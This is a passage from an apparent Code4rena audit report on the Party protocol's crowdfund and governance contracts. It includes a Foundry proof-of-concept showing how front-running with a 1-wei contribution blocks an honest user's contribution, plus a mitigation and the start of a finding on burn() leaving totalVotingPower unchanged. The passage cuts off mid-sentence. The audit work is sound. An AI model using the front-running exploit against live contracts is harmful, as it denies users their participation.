class=\"mtk12\">previousVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pendingVotingPower</span><span class=\"mtk1\">[</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">234</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">235</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">pendingVotingPower</span><span class=\"mtk1\">[</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">236</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">237</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// Mint a crowdfund NFT if this is their first contribution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">previousVotingPower</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit DOS by sending dust</span></span></span></code></pre>\n<p>As we can see, it mints the NFT when <code>previousVotingPower == 0</code> to mint for the first contribution.</p>\n<p>But <code>votingPower</code> from <code>_processContribution()</code> might be 0 even if <code>amount > 0</code> and <code>pendingVotingPower[contributor]</code> would be remained as 0 after the first contribution.</p>\n<p>Then this function will revert from the second contribution as it tries to mint the NFT again.</p>\n<p>The below shows the detailed scenario and POC.</p>\n<ol>\n<li>Let’s assume <code>exchangeRateBps = 5e3</code>. So <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L233\">votingPower for 1 wei is zero</a>. Also, <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/sol-tests/crowdfund/ReraiseETHCrowdfund.t.sol#L251\">from the test configurations</a>, it’s not a strong condition to assume <code>minContributions = 0</code>.</li>\n<li>After noticing an honest user contributes with 1 ether, an attacker frontruns <code>contributeFor()</code> for the honest user with 1 wei.</li>\n<li>Then the crowdfund NFT of the honest user will be minted but the voting power is still 0.</li>\n<li>During the honest user’s <code>contribute()</code>, it will try to mint the NFT again as <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ReraiseETHCrowdfund.sol#L238\">previousVotingPower == 0</a> and revert. So he can’t contribute for this crowdfund.</li>\n</ol>\n<p>While executing the POC, <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/sol-tests/crowdfund/ReraiseETHCrowdfund.t.sol#L72\">opts.exchangeRateBps</a> should be <code>5e3</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_contribute_DOSByFrontrunnerWithDust</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ReraiseETHCrowdfund</span><span class=\"mtk1\"> </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_createCrowdfund</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialContribution:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialContributor:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">initialDelegate:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint96</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">disableContributingForExistingCard:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">minTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">3</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">maxTotalContributions:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">duration:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fundingSplitBps:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">fundingSplitRecipient:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">honest</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_randomAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//attacker has 1 wei</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">honest</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//honest user has 1 ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Contribute</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//attacker frontruns for the honest user</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contributeFor</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> }(</span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">honest</span><span class=\"mtk1\">), </span><span class=\"mtk12\">honest</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">honest</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//crowdfund NFT of the honest users was minted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">pendingVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">honest</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//voting power = 0 because of the low exchangeRateBps</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">CrowdfundNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AlreadyMintedError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">honest</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint160</span><span class=\"mtk1\">(</span><span class=\"mtk12\">honest</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">honest</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//when the honest user contributes, reverts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">contribute</span><span class=\"mtk1\">{ value: </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">honest</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Recommend minting the crowdfund NFT when the new <code>votingPower</code> is positive. Then we can avoid duplicate mints.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk7\">2023</span><span class=\"mtk1\">-</span><span class=\"mtk7\">04</span><span class=\"mtk1\">-</span><span class=\"mtk12\">party</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">crowdfund</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">ReraiseETHCrowdfund</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">previousVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pendingVotingPower</span><span class=\"mtk1\">[</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">234</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">235</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">pendingVotingPower</span><span class=\"mtk1\">[</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">] += </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">236</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">237</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// Mint a crowdfund NFT if this is their first meaningful contribution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">previousVotingPower</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">contributor</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//++++++++++++++++</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/18#issuecomment-1518922059\">0xble (Party) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Will be mitigated by reverting if contributing leads to zero voting power (i.e. <code>contributionAmount * exchangeRateBps / 1e4 == 0</code>).</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-partygovernancenftsol-burn-function-does-not-reduce-totalvotingpower-making-it-impossible-to-reach-unanimous-votes\" style=\"position:relative;\"><a href=\"#m-06-partygovernancenftsol-burn-function-does-not-reduce-totalvotingpower-making-it-impossible-to-reach-unanimous-votes\" aria-label=\"m 06 partygovernancenftsol burn function does not reduce totalvotingpower making it impossible to reach unanimous votes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/10\">[M-06] <code>PartyGovernanceNFT.sol</code>: burn function does not reduce <code>totalVotingPower</code> making it impossible to reach unanimous votes</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/10\">HollaDieWaldfee</a></em></p>\n<p>With the new version of the Party protocol the <a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L201-L224\"><code>PartyGovernanceNFT.burn</code></a> function has been introduced.</p>\n<p>This function is used to burn party cards.</p>\n<p>According to the sponsor the initial purpose of this function was to enable the <a href=\"https://github.com/code-423n4/2023-04-party/blob/main/contracts/crowdfund/InitialETHCrowdfund.sol\"><code>InitialETHCrowdfund</code></a> contract (the <code>burn</code> function is needed for refunds).</p>\n<p>Later on they decided to allow any user to call this function and to burn their party cards.</p>\n<p>The second use case when a regular user burns his party card is when the issue occurs.</p>\n<p>The <code>PartyGovernanceNFT.burn</code> function does not decrease <code>totalVotingPower</code> which makes it impossible to reach an unanimous vote after a call to this function and it makes remaining votes of existing users less valuable than they should be.</p>\n<h3 id=\"proof-of-concept-12\" style=\"position:relative;\"><a href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Let’s look at the <code>PartyGovernanceNFT.burn</code> function:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernanceNFT.sol#L201-L224\">Link</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyDelegateCall</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">getApproved</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">] != </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        !</span><span class=\"mtk12\">isApprovedForAll</span><span class=\"mtk1\">[</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Allow minter to burn cards if the total voting power has not yet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// been set (e.g. for initial crowdfunds) meaning the party has not</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// yet started.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_governanceValues</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalVotingPower</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || !</span><span class=\"mtk12\">isAuthority</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">UnauthorizedToBurnError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint96</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">votingPowerByTokenId</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">].</span><span class=\"mtk11\">safeCastUint256ToUint96</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mintedVotingPower</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPowerByTokenId</span><span class=\"mtk1\">[</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_adjustVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, -</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastUint96ToInt192</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>It burns the party card specified by the <code>tokenId</code> parameter and makes the appropriate changes to the voting power of the owner (by calling <code>_adjustVotingPower</code>) and to <code>mintedVotingPower</code>.</p>\n<p>But it does not reduce <code>totalVotingPower</code> which remains untouched by this function.</p>\n<p>In case this function is called by <code>InitialETHCrowdfund</code> it is intended that <code>totalVotingPower</code> is not reduced. In this case the <code>burn</code> function is only called when the initial crowdfund is lost and <code>totalVotingPower</code> hasn’t even been increased so it is still <code>0</code> (the initial value).</p>\n<p>But why is it an issue when a regular user calls this function?</p>\n<p>Let’s consider the following scenario:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Alice: 100 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Bob: 100 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Chris: 100 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">totalVotingPower = 300 Votes</span></span></code></pre>\n<p>Now Alice decides to burn half of her voting power:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Alice: 50 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Bob: 100 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Chris: 100 Votes</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">totalVotingPower = 300 Votes</span></span></code></pre>\n<p>Now it is easy to see why it is a problem that <code>totalVotingPower</code> is not reduced.</p>\n<p>It is impossible to reach an unanimous vote because even if all users vote there is only a <code>(250/300) = ~83%</code> agreement.</p>\n<p>One vote only represents <code>1/300 = ~ 0.33%</code> of all votes even though it should represent <code>1/250 = 0.4%</code> of all votes. And thereby votes are less valuable than they should be.</p>\n<p>You can see in the following test that <code>totalVotingPower</code> stays unaffected even though <code>voter1</code> burns his party card which represents a third of all votes.</p>\n<p>(Add the test to the 